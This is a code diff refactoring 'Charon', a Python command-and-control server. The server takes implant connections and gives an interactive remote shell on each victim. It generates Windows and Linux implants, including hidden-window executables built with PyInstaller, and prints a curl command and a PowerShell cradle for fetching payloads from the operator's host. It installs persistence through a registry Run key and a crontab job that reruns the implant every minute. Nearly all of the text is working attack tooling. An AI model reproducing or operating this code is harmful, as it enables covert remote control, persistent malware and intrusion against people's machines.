@@ -1,6 +1,7 @@
-#!/usr/bin/python3 
+#!/usr/bin/python3
 
 import base64
+import contextlib
 import random
 import shutil
 import socket
@@ -12,6 +13,7 @@ from datetime import datetime
 from prettytable import PrettyTable
 from Config.design import *
 from Config.commands import *
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 
 def comm_in(targ_id):
@@ -64,65 +66,75 @@ def target_comm(targ_id, targets, num):
     """
 
     while True:
-        message = input(Fore.YELLOW + f"{targets[num][3]}@{targets[num][1]}$ " + Style.RESET_ALL)
+        message = input(
+            f"{Fore.YELLOW}{targets[num][3]}@{targets[num][1]}$ {Style.RESET_ALL}"
+        )
         if len(message) == 0:
             continue
 
-        else:
-            comm_out(targ_id, message)
-            # Exit
-            if message == 'exit':
-                message = base64.b64encode(message.encode())
-                targ_id.send(message)
-                targ_id.close()
-                # Mark client as dead in sessions list
-                targets[num][7] = 'Dead'
-                break
+        comm_out(targ_id, message)
+        # Exit
+        if message == 'exit':
+            message = base64.b64encode(message.encode())
+            targ_id.send(message)
+            targ_id.close()
+            # Mark client as dead in sessions list
+            targets[num][7] = 'Dead'
+            break
 
             # Commands
-            if message == 'background' or message == 'bg':
+        if message in ['background', 'bg']:
+            break
+
+        if message in ['persist', 'pt']:
+            payload_name = input(
+                f"{Fore.BLUE}[i] Enter Payload Name to Persist: {Style.RESET_ALL}"
+            )
+            if targets[num][6] == 1:
+                # Command 1
+                persist_command_1 = f'cmd.exe /c copy {payload_name} C:/Users/Public'
+                targ_id.send(persist_command_1.encode())
+                # Command 2
+                persist_command_2 = f'reg add HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion' \
+                                    f'/Run -v screendoor /t REG_SZ /d C:/Users/Public/{payload_name}'
+                _extracted_from_target_comm_42(
+                    targ_id,
+                    persist_command_2,
+                    "Run this command to cleanup the registry: \nreg delete "
+                    "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v screendoor /f",
+                )
+            if targets[num][6] == 2:
+                persist_command = f'echo "*/1 * * * * python3 /home/{targets[num][3]}/{payload_name}" | crontab -'
+                _extracted_from_target_comm_42(
+                    targ_id,
+                    persist_command,
+                    "Run this command to clean up crontab: \n crontab -r",
+                )
+        try:
+            if message == "download":
+                sock.send((message).encode())
+                exist = targ_id.recv(1024).decode()
+        except OSError:
+            error("File does not exist")
+            continue
+
+        else:
+            response = comm_in(targ_id)
+            if response == 'exit':
+                error("Client Connection Closed")
+                targ_id.close()
                 break
 
-            if message == 'help' or message == 'h':
-                pass
+            print(response)
 
-            if message == 'persist' or message == 'pt':
-                payload_name = input(Fore.BLUE + "[i] Enter Payload Name to Persist: " + Style.RESET_ALL)
-                if targets[num][6] == 1:
-                    # Command 1
-                    persist_command_1 = f'cmd.exe /c copy {payload_name} C:/Users/Public'
-                    targ_id.send(persist_command_1.encode())
-                    # Command 2
-                    persist_command_2 = f'reg add HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion' \
-                                        f'/Run -v screendoor /t REG_SZ /d C:/Users/Public/{payload_name}'
-                    targ_id.send(persist_command_2.encode())
+
+# TODO Rename this here and in `target_comm`
+def _extracted_from_target_comm_42(targ_id, arg1, arg2):
+    targ_id.send(arg1.encode())
 
                     # Always keep a command to clean up endpoints after an engagement
-                    process("Run this command to cleanup the registry: \nreg delete "
-                            "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v screendoor /f")
-                    success("Persistence Technique Completed")
-
-                if targets[num][6] == 2:
-                    persist_command = f'echo "*/1 * * * * python3 /home/{targets[num][3]}/{payload_name}" | crontab -'
-                    targ_id.send(persist_command.encode())
-                    process("Run this command to clean up crontab: \n crontab -r")
-                    success("Persistence Technique Completed")
-            try:
-                if message == "download":
-                    sock.send((message).encode())
-                    exist = targ_id.recv(1024).decode()
-            except OSError:
-                error("File does not exist")
-                continue
-
-            else:
-                response = comm_in(targ_id)
-                if response == 'exit':
-                    error("Client Connection Closed")
-                    targ_id.close()
-                    break
-
-                print(response)
+    process(arg2)
+    success("Persistence Technique Completed")
 
 
 def listener_handler():
@@ -144,13 +156,8 @@ def comm_handler():
     :return:
     """
 
-    while True:
-
-        # If KeyboardInterrupt is issued then kill connection
-        if kill_flag == 1:
-            break
-
-        try:
+    while kill_flag != 1:
+        with contextlib.suppress(Exception):
             remote_target, remote_ip = sock.accept()
 
             # Get info from implant
@@ -175,11 +182,7 @@ def comm_handler():
                 admin_val = "User"
 
             # Operating System
-            if 'Windows' in op_sys:
-                pay_val = 1
-            else:
-                pay_val = 2
-
+            pay_val = 1 if 'Windows' in op_sys else 2
             # Time
             cur_time = time.strftime("%H:%M:%S", time.localtime())
             date = datetime.now()
@@ -198,12 +201,12 @@ def comm_handler():
                                 'Active'  # Status
                                 ])
 
-                print(Fore.GREEN +
-                      f'\n[+] Connection Received from {host_name[0]}@{remote_ip}\n' +
-                      Style.RESET_ALL +  # Reset Text Colour
-                      Fore.YELLOW +  # Yellow Text
-                      f'{host_name}@{remote_ip}' +  # Device Name@IP
-                      Style.RESET_ALL, end='')
+                print(
+                    f'{Fore.GREEN}\n[+] Connection Received from {host_name[0]}@{remote_ip}\n{Style.RESET_ALL}{Fore.YELLOW}'
+                    + f'{host_name}@{remote_ip}'
+                    + Style.RESET_ALL,
+                    end='',
+                )
 
             else:
                 targets.append([remote_target,
@@ -215,15 +218,12 @@ def comm_handler():
                                 pay_val,
                                 'Active'
                                 ])
-                print(Fore.GREEN +
-                      f'\n[+] Connection Received from {remote_ip[0]}\n' +
-                      Style.RESET_ALL +
-                      Fore.YELLOW +
-                      f'Client@{host_ip}$ ' +
-                      Style.RESET_ALL, end='')
-
-        except Exception:
-            pass
+                print(
+                    f'{Fore.GREEN}\n[+] Connection Received from {remote_ip[0]}\n{Style.RESET_ALL}{Fore.YELLOW}'
+                    + f'Client@{host_ip}$ '
+                    + Style.RESET_ALL,
+                    end='',
+                )
 
 
 # Windows Payloads
@@ -273,7 +273,7 @@ def linplant():
     file_name = f'{ran_name}.py'
     generated = f'Generated Payloads/{file_name}'
 
-    if os.path.exists(f'Implants/linplant.py'):
+    if os.path.exists('Implants/linplant.py'):
         shutil.copy('Implants/linplant.py', generated)
     else:
         error("File Not Found - linplant.py")
@@ -310,7 +310,7 @@ def exeplant():
     exe_file = f'{ran_name}.exe'
     generated = f'Generated Payloads/{file_name}'
 
-    if os.path.exists(f'Implants/winplant.py'):
+    if os.path.exists('Implants/winplant.py'):
         shutil.copy('Implants/winplant.py', generated)
     else:
         error("File Not Found - winplant.py")
@@ -337,7 +337,7 @@ def exeplant():
     if os.path.exists(generated):
         success(f"{file_name} saved to {generated}")
     else:
-        error(f"Error occurred during payload generation")
+        error("Error occurred during payload generation")
 
     # PyInstaller Command Handling
     pyinstaller_exec = f'pyinstaller "Generated Payloads/{file_name}" -w --clean --onefile --distpath .'
@@ -352,7 +352,7 @@ def exeplant():
             info(f"curl http://{host_ip}:PORT/{file_name} -o {file_name}")
 
         else:
-            error(f"Executable Generation Failed")
+            error("Executable Generation Failed")
     except FileNotFoundError:
         error("Executable Generation Failed")
 
@@ -364,9 +364,13 @@ def pshell_cradle():
     :return:
     """
 
-    web_server_ip = input(Fore.BLUE + "[i] Web Server Listening Host: " + Style.RESET_ALL)
-    web_server_port = input(Fore.BLUE + "[i] Web Server Listening Port: " + Style.RESET_ALL)
-    payload_name = input(Fore.BLUE + "[i] Payload Name: " + Style.RESET_ALL)
+    web_server_ip = input(
+        f"{Fore.BLUE}[i] Web Server Listening Host: {Style.RESET_ALL}"
+    )
+    web_server_port = input(
+        f"{Fore.BLUE}[i] Web Server Listening Port: {Style.RESET_ALL}"
+    )
+    payload_name = input(f"{Fore.BLUE}[i] Payload Name: {Style.RESET_ALL}")
     runner_file = (''.join(random.choices(string.ascii_lowercase, k=6)))
     randomised_exe_file = (''.join(random.choices(string.ascii_lowercase, k=6)))
     randomised_exe_file = f"{randomised_exe_file}.exe"
@@ -389,7 +393,6 @@ def pshell_cradle():
 # Main Function
 
 if __name__ == "__main__":
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     # Target List Store
     targets = []
     banner()
@@ -403,16 +406,22 @@ if __name__ == "__main__":
 
     while True:
         try:
-            command = input(Fore.LIGHTMAGENTA_EX + f"Charon@{host_ip}$ " + Style.RESET_ALL).strip()
+            command = input(
+                f"{Fore.LIGHTMAGENTA_EX}Charon@{host_ip}$ {Style.RESET_ALL}"
+            ).strip()
 
-            match command:
+            match command.strip():
                 case ('help' | 'h'):
                     help()
                 case ('clear' | 'cls'):
                     clear()
                 case ('listeners -g' | 'listeners --generate'):
-                    host_ip = input(Fore.BLUE + "[i] Enter Listener IP: " + Style.RESET_ALL)
-                    host_port = input(Fore.BLUE + "[i] Enter Listener Port: " + Style.RESET_ALL)
+                    host_ip = input(
+                        f"{Fore.BLUE}[i] Enter Listener IP: {Style.RESET_ALL}"
+                    )
+                    host_port = input(
+                        f"{Fore.BLUE}[i] Enter Listener Port: {Style.RESET_ALL}"
+                    )
                     listener_handler()
                     listener_counter += 1
 
@@ -437,36 +446,36 @@ if __name__ == "__main__":
                         error("Generate Listener First")
                 case ('exit'):
                     quit_message = input(
-                        Fore.LIGHTRED_EX + "\n[!] Are you sure you want to quit? (yes/no): " + Style.RESET_ALL).lower()
-                    if quit_message == 'y' or quit_message == 'yes':
-                        tar_length = len(targets)
-                        # Delete Payloads
-                        process("Deleting Payloads")
-                        try:
-                            if os.path.exists('Generated Payloads'):
-                                shutil.rmtree('Generated Payloads')
-                        except PermissionError:
-                            error("Permission Denied - Payload is still running")
-                            break
-                        for target in targets:
-                            if target[7] == 'Dead':
-                                pass
-                            else:
-                                comm_out(target[0], 'exit')
-                        kill_flag = 1
-                        if listener_counter > 0:
-                            sock.close()
-                        quit("Quitting...")
-                        break
-                    else:
+                        Fore.LIGHTRED_EX
+                        + "\n[!] Are you sure you want to quit? (yes/no): "
+                        + Style.RESET_ALL
+                    ).lower()
+                    if quit_message.strip() not in ['y', 'yes']:
                         continue
 
+                    tar_length = len(targets)
+                    # Delete Payloads
+                    process("Deleting Payloads")
+                    try:
+                        if os.path.exists('Generated Payloads'):
+                            shutil.rmtree('Generated Payloads')
+                    except PermissionError:
+                        error("Permission Denied - Payload is still running")
+                        break
+                    for target in targets:
+                        if target[7] != 'Dead':
+                            comm_out(target[0], 'exit')
+                    kill_flag = 1
+                    if listener_counter > 0:
+                        sock.close()
+                    quit("Quitting...")
+                    break
             # Generate Sessions Commands
             if command.split(" ")[0] == 'sessions':
                 session_counter = 0
 
                 # List Sessions
-                if command.split(" ")[1] == '-l' or command.split(" ")[1] == '--list':
+                if command.split(" ")[1] in ['-l', '--list']:
 
                     # Define Table
                     myTable = PrettyTable()
@@ -495,10 +504,10 @@ if __name__ == "__main__":
                     # Print Table
                     print(myTable)
                     print(Style.RESET_ALL)
-                # Interact with Session                        
-                if command.split(" ")[1] == '-i' or command.split(" ")[1] == '--interact':
+                # Interact with Session
+                if command.split(" ")[1].strip() in ['-i', '--interact']:
                     try:
-                        num = int(command.split(" ")[2])
+                        num = int(command.split(" ")[2].strip())
                         targ_id = (targets[num])[0]
                         if (targets[num])[7] == 'Active':
                             target_comm(targ_id, targets, num)
@@ -508,9 +517,9 @@ if __name__ == "__main__":
                         error(f"Session {num} does not exist")
 
                 # Kill Session
-                if command.split(" ")[1] == '-k' or command.split(" ")[1] == '--kill':
+                if command.split(" ")[1].strip() in ['-k', '--kill']:
                     try:
-                        num = int(command.split(" ")[2])
+                        num = int(command.split(" ")[2].strip())
                         targ_id = (targets[num])[0]
                         if (targets[num])[7] == 'Active':
                             kill_sig(targ_id, 'exit')
@@ -526,28 +535,25 @@ if __name__ == "__main__":
         except KeyboardInterrupt:
             quit_message = input(
                 Fore.LIGHTRED_EX + "\n[!] Are you sure you want to quit? (yes/no): " + Style.RESET_ALL).lower()
-            if quit_message == 'y' or quit_message == 'yes':
-                tar_length = len(targets)
-                # Delete Payloads
-                process("Deleting Payloads")
-                try:
-                    if os.path.exists('Generated Payloads'):
-                        shutil.rmtree('Generated Payloads')
-                except PermissionError:
-                    error("Permission Denied - Payload is still running")
-                    break
-                for target in targets:
-                    if target[7] == 'Dead':
-                        pass
-                    else:
-                        comm_out(target[0], 'exit')
-                kill_flag = 1
-                if listener_counter > 0:
-                    sock.close()
-                quit("Quitting...")
-                break
-            else:
+            if quit_message.strip() not in ['y', 'yes']:
                 continue
 
+            tar_length = len(targets)
+            # Delete Payloads
+            process("Deleting Payloads")
+            try:
+                if os.path.exists('Generated Payloads'):
+                    shutil.rmtree('Generated Payloads')
+            except PermissionError:
+                error("Permission Denied - Payload is still running")
+                break
+            for target in targets:
+                if target[7] != 'Dead':
+                    comm_out(target[0], 'exit')
+            kill_flag = 1
+            if listener_counter > 0:
+                sock.close()
+            quit("Quitting...")
+            break
         except ConnectionAbortedError:
             break
